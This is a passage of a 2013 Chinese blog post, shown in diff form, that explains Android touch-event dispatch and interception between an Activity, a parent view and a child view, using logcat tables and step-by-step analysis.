+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.812</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.892</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | dispatchTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.892</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | onTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">结果分析</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">代码运行后，事件首先由 TouchEventActivity 的 dispatchTouchEvent 方法分发给 TouchEventFather 控件的 dispatchTouchEvent，而该控件的 dispatchTouchEvent 返回 super.dispatchTouchEvent(ev)，表示对事件进行分发并向下传递给 TouchEventFather 控件的 onInterceptTouchEvent 方法，该方法返回 false 表示事件会被放行并传递到子控件 TouchEventChilds 的 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent </span></span></span>方法，同样 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds&nbsp;</span></span></span>的 dispatchTouchEvent 返回 super.dispatchTouchEvent(ev)，<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">表示对事件进行分发并向下传递给</span></span></span> <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件的 onInterceptTouchEvent 方法</span></span></span>，<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>的 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>方法返回 super.onInterceptTouchEvent(ev) 默认会将事件传递给 TouchEventChilds 的 onTouchEvent 进行处理，<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>的 onTouchEvent 返回 super.onTouchEvent(ev) <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">表示对事件没有做任何处理直接将事件返回给上级控件，由于 TouchEventChilds 获取的事件直接来自 </span></span>TouchEventFather，所以 TouchEventChilds 控件的 onTouchEvent <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">会将事件以冒泡方式直接返回给&nbsp;TouchEventFather 的 onTouchEvent 进行消费，而 TouchEventFather 的 onTouchEvent 也返回了 super.onTouchEvent(ev)，同样 TouchEventFather 的 onTouchEvent 也会将事件返回给上级控件，而 TouchEventFather 获取的事件直接来自 TouchEventActivity，所以 TouchEventFather 控件的 onTouchEvent 会将事件以冒泡方式直接返回给 TouchEventActivity 的 onTouchEvent 进行消费，后续的事件则会跳过 TouchEventFather 和&nbsp;TouchEventChilds 直接由 TouchEventActivity 的 onTouchEvent 消费来自 TouchEventActivity 自身分发的事件。</span></span><br /></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p>&nbsp;<strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Case 5</span></strong></p>
+<table style="border: 0px solid #79787d; width: 980px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">拦截条件</span></strong></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件名称 </span></strong></td>
+<td style="text-align: center;" colspan="3"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;" colspan="4"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent 返回值</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity</span></span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">--- </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">false</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">true</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">运行结果</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Level</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Time</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">PID</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Application</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Tag</span></span></span></span></span></span></td>
+<td style="text-align: center;" colspan="5">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Text</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 08:11:18.403</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 08:11:18.403</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;05-10 08:11:18.403</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">574</span></td>
+<td style="text-align: center;"><span style="color: #339966; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #339966; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp; TouchEventFather | onInterceptTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 08:11:18.403</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventChilds | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 08:11:19.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 08:11:19.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;05-10 08:11:19.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">574</span></td>
+<td style="text-align: center;"><span style="color: #339966; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #339966; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp; TouchEventFather | onInterceptTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 08:11:19.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventChilds | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 08:11:19.872</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">574</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">05-10 08:11:19.872</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">05-10 08:11:19.872</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">574</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #339966; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp; TouchEventFather | onInterceptTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 08:11:19.872</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">574</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventChilds | dispatchTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">结果分析</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">代码运行后，事件首先由 TouchEventActivity 的 dispatchTouchEvent 方法分发给 TouchEventFather 控件的 </span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent，该控件的 dispatchTouchEvent 返回 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span>，</span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">事件会分发到 TouchEventFather 的 onInterceptTouchEvent，onInterceptTouchEvent 返回 false 表示放行当先事件；事件会被传递到子控件 TouchEventChilds 的 dispatchTouchEvent 方法，dispatchTouchEvent 返回 true 表示事件被分发到 TouchEventChilds 控件并由该控件的 dispatchTouchEvent 方法消费。后续的事件也会不断的重复上面的逻辑最终被 TouchEventChilds 的 dispatchTouchEvent 消费。<br /></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p>&nbsp;<strong>四<span>、<span>源码下载</span></span></strong></p>
+<p><span style="font-family: arial, helvetica, sans-serif; font-size: 13px;">&nbsp;下载地址：<a title="TouchEvent" href="http://files.cnblogs.com/sunzn/TouchEvent.rar" target="_blank">TouchEvent.rar</a></span></p>
+<p><span style="font-family: arial, helvetica, sans-serif;">&nbsp;<strong>五</strong><strong>、相关文档</strong></span></p>
+<p><span style="font-family: arial, helvetica, sans-serif; font-size: 13px;">&nbsp;文档地址：<a href="http://files.cnblogs.com/sunzn/PRE_andevcon_mastering-the-android-touch-system.pdf" target="_blank">PRE_andevcon_mastering-the-android-touch-system.pdf</a></span></p></div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+
+
+		</div>
+		<div class = "postDesc">posted @ <span id="post-date">2013-05-10 12:20</span> <a href='http://www.cnblogs.com/sunzn/'>sunzn</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href ="https://i.cnblogs.com/EditPosts.aspx?postid=3064129" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(3064129);return false;">收藏</a></div>
+	</div>
